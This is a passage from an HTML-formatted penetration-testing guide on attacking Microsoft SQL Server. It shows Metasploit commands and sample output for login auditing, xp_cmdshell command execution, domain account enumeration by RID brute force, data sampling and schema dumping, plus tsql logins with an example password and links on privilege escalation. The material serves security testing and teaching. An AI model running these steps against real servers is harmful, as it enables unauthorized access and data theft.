<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_SQLAuthenticatorCertificate##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicySigningCertificate##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_SmoExtendedSigningCertificate##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyEventProcessingLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyTsqlExecutionLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_AgentSigningCertificate##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EXAMPLE</span>\<span class="n">Administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">OTH</span><span class="o">-</span><span class="n">EXAMPLE</span>\<span class="n">altadmin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLWriter</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">Winmgmt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">Service</span>\<span class="n">MSSQLSERVER</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLSERVERAGENT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">ReportServer</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Disabled</span> <span class="n">Accounts</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyEventProcessingLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyTsqlExecutionLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">Accounts</span> <span class="n">Policy</span> <span class="ow">is</span> <span class="nb">set</span> <span class="k">for</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">All</span> <span class="n">System</span> <span class="n">Accounts</span> <span class="n">have</span> <span class="n">the</span> <span class="n">Windows</span> <span class="n">Account</span> <span class="n">Policy</span> <span class="n">Applied</span> <span class="n">to</span> <span class="n">them</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Password</span> <span class="n">Expiration</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">checked</span> <span class="k">for</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sa</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyEventProcessingLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_PolicyTsqlExecutionLogin##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">System</span> <span class="n">Admin</span> <span class="n">Logins</span> <span class="n">on</span> <span class="n">this</span> <span class="n">Server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sa</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EXAMPLE</span>\<span class="n">Administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">OTH</span><span class="o">-</span><span class="n">EXAMPLE</span>\<span class="n">altadmin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLWriter</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">Winmgmt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">Service</span>\<span class="n">MSSQLSERVER</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLSERVERAGENT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Logins</span> <span class="n">on</span> <span class="n">this</span> <span class="n">Server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EXAMPLE</span>\<span class="n">Administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">OTH</span><span class="o">-</span><span class="n">EXAMPLE</span>\<span class="n">altadmin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLWriter</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">Winmgmt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">Service</span>\<span class="n">MSSQLSERVER</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">SQLSERVERAGENT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">SERVICE</span>\<span class="n">ReportServer</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Groups</span> <span class="n">that</span> <span class="n">can</span> <span class="n">logins</span> <span class="n">on</span> <span class="n">this</span> <span class="n">Server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">No</span> <span class="n">Windows</span> <span class="n">Groups</span> <span class="n">where</span> <span class="n">found</span> <span class="k">with</span> <span class="n">permission</span> <span class="n">to</span> <span class="n">login</span> <span class="n">to</span> <span class="n">system</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Accounts</span> <span class="k">with</span> <span class="n">Username</span> <span class="ow">and</span> <span class="n">Password</span> <span class="n">being</span> <span class="n">the</span> <span class="n">same</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">No</span> <span class="n">Account</span> <span class="k">with</span> <span class="n">its</span> <span class="n">password</span> <span class="n">being</span> <span class="n">the</span> <span class="n">same</span> <span class="k">as</span> <span class="n">its</span> <span class="n">username</span> <span class="n">was</span> <span class="n">found</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Accounts</span> <span class="k">with</span> <span class="n">empty</span> <span class="n">password</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">No</span> <span class="n">Accounts</span> <span class="k">with</span> <span class="n">empty</span> <span class="n">passwords</span> <span class="n">where</span> <span class="n">found</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stored</span> <span class="n">Procedures</span> <span class="k">with</span> <span class="n">Public</span> <span class="n">Execute</span> <span class="n">Permission</span> <span class="n">found</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replsetsyncstatus</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replcounters</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replsendtoqueue</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_resyncexecutesql</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_prepexecrpc</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_repltrans</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_xml_preparedocument</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_qv</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_getnetname</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_releaseschemalock</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_refreshview</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replcmds</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_unprepare</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_resyncprepare</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_createorphan</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_dirtree</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replwritetovarbin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replsetoriginator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_xml_removedocument</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_repldone</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_reset_connection</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_fileexist</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_fixeddrives</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_getschemalock</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_prepexec</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_revokelogin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_resyncuniquetable</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replflush</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_resyncexecute</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_grantlogin</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_droporphans</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_regread</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_getbindtoken</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sp_replincrementlsn</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Instances</span> <span class="n">found</span> <span class="n">on</span> <span class="n">this</span> <span class="n">server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">MSSQLSERVER</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">SQLEXPRESS</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Default</span> <span class="n">Server</span> <span class="n">Instance</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Service</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">under</span> <span class="n">the</span> <span class="n">privilege</span> <span class="n">of</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">Service</span>\<span class="n">MSSQLSERVER</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Instance</span> <span class="n">SQLEXPRESS</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Service</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">under</span> <span class="n">the</span> <span class="n">privilege</span> <span class="n">of</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NETWORKSERVICE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
<p>Next, we can execute command using</p>
</div>
<div class="section" id="microsoft-sql-server-xp-cmdshell-command-execution">
<h4>Microsoft SQL Server xp_cmdshell Command Execution<a class="headerlink" href="#microsoft-sql-server-xp-cmdshell-command-execution" title="Permalink to this headline">¶</a></h4>
<p>if xp_cmdshell is enabled and if the user has permissions.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_exec</span>
<span class="nb">set</span> <span class="n">RHOst</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="nb">set</span> <span class="n">password</span> <span class="n">company</span><span class="nd">@123</span>
<span class="nb">set</span> <span class="n">cmd</span> <span class="n">ipconfig</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Windows</span> <span class="n">IP</span> <span class="n">Configuration</span>


 <span class="n">Ethernet</span> <span class="n">adapter</span> <span class="n">LAN</span><span class="p">:</span>

    <span class="n">Connection</span><span class="o">-</span><span class="n">specific</span> <span class="n">DNS</span> <span class="n">Suffix</span>  <span class="o">.</span> <span class="p">:</span>
    <span class="n">IPv4</span> <span class="n">Address</span><span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
    <span class="n">Subnet</span> <span class="n">Mask</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
    <span class="n">Default</span> <span class="n">Gateway</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

  <span class="n">Ethernet</span> <span class="n">adapter</span> <span class="n">Local</span> <span class="n">Area</span> <span class="n">Connection</span> <span class="mi">3</span><span class="p">:</span>

    <span class="n">Connection</span><span class="o">-</span><span class="n">specific</span> <span class="n">DNS</span> <span class="n">Suffix</span>  <span class="o">.</span> <span class="p">:</span>
    <span class="n">Link</span><span class="o">-</span><span class="n">local</span> <span class="n">IPv6</span> <span class="n">Address</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">798</span><span class="n">f</span><span class="p">:</span><span class="mi">6</span><span class="n">cad</span><span class="p">:</span><span class="mi">4</span><span class="n">f1e</span><span class="p">:</span><span class="n">c5fb</span><span class="o">%</span><span class="mi">15</span>
    <span class="n">Autoconfiguration</span> <span class="n">IPv4</span> <span class="n">Address</span><span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">169.254</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
    <span class="n">Subnet</span> <span class="n">Mask</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
    <span class="n">Default</span> <span class="n">Gateway</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span>

 <span class="n">Tunnel</span> <span class="n">adapter</span> <span class="n">isatap</span><span class="o">.</span><span class="p">{</span><span class="n">D295B095</span><span class="o">-</span><span class="mi">19</span><span class="n">EB</span><span class="o">-</span><span class="mf">436E-97</span><span class="n">D0</span><span class="o">-</span><span class="mi">4</span><span class="n">D22486521CC</span><span class="p">}:</span>

    <span class="n">Media</span> <span class="n">State</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="n">Media</span> <span class="n">disconnected</span>
    <span class="n">Connection</span><span class="o">-</span><span class="n">specific</span> <span class="n">DNS</span> <span class="n">Suffix</span>  <span class="o">.</span> <span class="p">:</span>

 <span class="n">Tunnel</span> <span class="n">adapter</span> <span class="n">isatap</span><span class="o">.</span><span class="p">{</span><span class="n">A738E25A</span><span class="o">-</span><span class="n">F5E3</span><span class="o">-</span><span class="mf">4E36</span><span class="o">-</span><span class="mi">8</span><span class="n">F96</span><span class="o">-</span><span class="mf">6977E22136</span><span class="n">B6</span><span class="p">}:</span>

    <span class="n">Media</span> <span class="n">State</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="n">Media</span> <span class="n">disconnected</span>
    <span class="n">Connection</span><span class="o">-</span><span class="n">specific</span> <span class="n">DNS</span> <span class="n">Suffix</span>  <span class="o">.</span> <span class="p">:</span>
</pre></div>
</div>
</div>
<div class="section" id="microsoft-sql-server-suser-sname-windows-domain-account-enumeration">
<h4>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration<a class="headerlink" href="#microsoft-sql-server-suser-sname-windows-domain-account-enumeration" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_domain_accounts</span>
<span class="nb">set</span> <span class="n">rhost</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="nb">set</span> <span class="n">password</span> <span class="n">company</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">the</span> <span class="n">database</span> <span class="n">server</span> <span class="n">at</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1433</span> <span class="k">as</span> <span class="n">sa</span><span class="o">...</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connected</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Name</span><span class="p">:</span> <span class="n">EXAMPLECRM1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Domain</span> <span class="n">Name</span><span class="p">:</span> <span class="n">EXAMPLE</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">the</span> <span class="n">domain</span> <span class="n">sid</span><span class="p">:</span> <span class="mi">01050000000000051500000016</span><span class="n">c0ea32f450ba7443170a32</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Brute</span> <span class="n">forcing</span> <span class="mi">10000</span> <span class="n">RIDs</span> <span class="n">through</span> <span class="n">the</span> <span class="n">SQL</span> <span class="n">Server</span><span class="p">,</span> <span class="n">be</span> <span class="n">patient</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Guest</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">krbtg</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Domain</span> <span class="n">Admins</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Domain</span> <span class="n">Users</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Domain</span> <span class="n">Guests</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Domain</span> <span class="n">Computers</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Domain</span> <span class="n">Controllers</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Cert</span> <span class="n">Publishers</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Schema</span> <span class="n">Admins</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Group</span> <span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Read</span><span class="o">-</span><span class="n">only</span> <span class="n">Domain</span> <span class="n">Controllers</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">RAS</span> <span class="ow">and</span> <span class="n">IAS</span> <span class="n">Servers</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Allowed</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="o">-</span> <span class="n">EXAMPLE</span>\<span class="n">TsInternetUser</span>
</pre></div>
</div>
<p>Other fun modules to check are</p>
</div>
<div class="section" id="microsoft-sql-server-find-and-sample-data">
<h4>Microsoft SQL Server Find and Sample Data<a class="headerlink" href="#microsoft-sql-server-find-and-sample-data" title="Permalink to this headline">¶</a></h4>
<p>This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_findandsampledata</span>
</pre></div>
</div>
</div>
<div class="section" id="microsoft-sql-server-generic-query">
<h4>Microsoft SQL Server Generic Query<a class="headerlink" href="#microsoft-sql-server-generic-query" title="Permalink to this headline">¶</a></h4>
<p>Module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropiate credentials.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_sql</span>
</pre></div>
</div>
</div>
<div class="section" id="mssql-schema-dump">
<h4>MSSQL Schema Dump<a class="headerlink" href="#mssql-schema-dump" title="Permalink to this headline">¶</a></h4>
<p>Module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_schemadump</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id46">
<h3>Other<a class="headerlink" href="#id46" title="Permalink to this headline">¶</a></h3>
<p>We can also use</p>
<div class="section" id="tsql">
<h4>tsql<a class="headerlink" href="#tsql" title="Permalink to this headline">¶</a></h4>
<p>tsql command, install it by using freetds-bin package and use it like</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">tsql</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1433</span> <span class="o">-</span><span class="n">U</span> <span class="n">sa</span> <span class="o">-</span><span class="n">P</span> <span class="n">company</span><span class="nd">@123</span>
<span class="n">locale</span> <span class="ow">is</span> <span class="s2">&quot;en_IN&quot;</span>
<span class="n">locale</span> <span class="n">charset</span> <span class="ow">is</span> <span class="s2">&quot;UTF-8&quot;</span>
<span class="n">using</span> <span class="n">default</span> <span class="n">charset</span> <span class="s2">&quot;UTF-8&quot;</span>
<span class="mi">1</span><span class="o">&gt;</span> <span class="n">SELECT</span> <span class="n">suser_sname</span><span class="p">(</span><span class="n">owner_sid</span><span class="p">)</span>
<span class="mi">2</span><span class="o">&gt;</span> <span class="n">FROM</span> <span class="n">sys</span><span class="o">.</span><span class="n">databases</span>
<span class="mi">3</span><span class="o">&gt;</span> <span class="n">go</span>

<span class="n">sa</span>
<span class="n">sa</span>
<span class="n">sa</span>
<span class="n">sa</span>
<span class="n">EXAMPLE</span>\<span class="n">administrator</span>
<span class="n">EXAMPLE</span>\<span class="n">administrator</span>
<span class="n">EXAMPLE</span>\<span class="n">kuanxxxx</span>
<span class="p">(</span><span class="mi">7</span> <span class="n">rows</span> <span class="n">affected</span><span class="p">)</span>
</pre></div>
</div>
<p>See examples for Scott blogs, how to execute queries.</p>
</div>
<div class="section" id="microsoft-sql-server-management">
<h4>Microsoft SQL Server Management<a class="headerlink" href="#microsoft-sql-server-management" title="Permalink to this headline">¶</a></h4>
<p>Use Microsoft SQL Server Mangement tool to connect to Remote Database.</p>
</div>
</div>
<div class="section" id="reference-hacking-sql-server-stored-procedures">
<h3>Reference - Hacking SQL Server Stored Procedures<a class="headerlink" href="#reference-hacking-sql-server-stored-procedures" title="Permalink to this headline">¶</a></h3>
<p>Scott Sutherland has written four parts of <strong>Hacking SQL Servers</strong>:  ( A must-read )</p>
<div class="section" id="part-1-un-trustworthy-databases">
<h4>Part 1: (un)Trustworthy Databases<a class="headerlink" href="#part-1-un-trustworthy-databases" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db_Owner &#8216;mssql_escalate_dbowner&#8217;.</p>
</div>
<div class="section" id="part-2-user-impersonation">
<h4>Part 2: User Impersonation<a class="headerlink" href="#part-2-user-impersonation" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation&quot;">Hacking SQL Server Stored Procedures – Part 2: User Impersonation</a> : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS &#8216;mssql_escalate_execute_as&#8217;.</p>
</div>
<div class="section" id="part-3-sql-injection">
<h4>Part 3: SQL Injection<a class="headerlink" href="#part-3-sql-injection" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">Hacking SQL Server Stored Procedures – Part 3: SQL Injection</a> : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.</p>
</div>
<div class="section" id="part-4-enumerating-domain-accounts">
<h4>Part 4; Enumerating Domain Accounts<a class="headerlink" href="#part-4-enumerating-domain-accounts" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). It also shows how to enumerate SQL Server logins using a similar technique. Corresponding module is <strong>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</strong></p>
</div>
</div>
</div>
<div class="section" id="oracle-port-1521">
